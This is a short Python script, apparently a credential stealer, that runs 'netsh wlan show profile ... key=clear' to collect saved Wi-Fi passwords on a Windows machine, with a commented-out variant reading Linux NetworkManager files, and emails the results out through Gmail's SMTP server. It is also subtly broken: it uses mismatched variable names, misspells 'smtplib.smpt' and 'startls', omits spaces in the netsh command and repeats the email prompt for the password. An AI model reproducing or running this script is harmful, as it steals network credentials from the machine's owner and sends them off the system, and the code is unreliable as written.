#!/usr/bin/python
#coding: utf-8

import subprocess, smtplib, re

#command = "sudo cat /etc/NetworkManager/system-connections/*"
command1 = "netsh wlan show profile"
networks = subprocess.check_output(command1, shell=True)

#network_list = re.findall('(?:psk\s*)(.*)', networks)

nw_list = re.findall('(?:Profile\s*:\s)(.*)', networks)

output = ""

for network in network_list:
	#command2 = "sudo cat /etc/NetworkManager/system-connections/* " + network
	command = "netsh wlan show profile" + network + "key=clear"
	one_network = subprocess.check_output(command, shell=True)
	output += one_network

email = raw_input("Enter email to send to: ")
password = raw_input("Enter email to send to: ")


server = smtplib.smpt("smtp.gmail.com", 587)
server.startls()
server.login(email,password)
server.sendmail(email,email,output)
server.quit()
